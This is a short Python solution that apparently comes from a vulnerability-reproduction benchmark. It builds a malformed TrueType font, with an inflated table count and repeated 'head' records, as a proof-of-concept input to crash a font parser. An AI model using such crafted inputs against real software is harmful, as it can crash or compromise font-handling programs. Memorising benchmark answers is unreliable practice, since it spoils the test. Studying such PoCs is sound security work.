class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x00\x01\x00\x00\x00'
        poc += b'\xff\xff'
        poc += b'\x00\x10'
        poc += b'\x00\x01'
        poc += b'\xff\xff'
        for i in range(45):
            poc += b'head\x00\x00\x00\x00\x00\x00\x00\x44\x00\x00\x00\x36'
        poc += b'\x00' * (68 + 54)
        poc += b'\x00' * (800 - len(poc))
        return poc
